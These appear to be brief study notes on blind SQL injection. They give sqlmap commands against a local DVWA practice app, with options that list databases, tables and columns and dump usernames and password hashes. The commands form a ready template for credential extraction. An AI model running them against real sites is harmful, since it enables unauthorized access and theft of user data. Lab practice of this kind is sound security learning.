## SQL-Injections 
#### SQL (Blind) Injection example  
Blind SQL Injection is often used to build the database schema, and get all the data in the database. This is done using brute force techniques and does require many requests to be sent to the server.  

`sqlmap -u "url-of-attack" --cookie="full cookie name"`  

ex.  
`sqlmap -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#' --cookie="security=low; PHPSESSID=aadfsfsasfsdffsffsdfs"`  
options--
`--dbs`  list databases  
`-D dvwa --tables`  list all tables in the dvwa database  
`-T users --column`  list all columns in table users  
`-C user,password --dump` gets all usernames and password hashes 
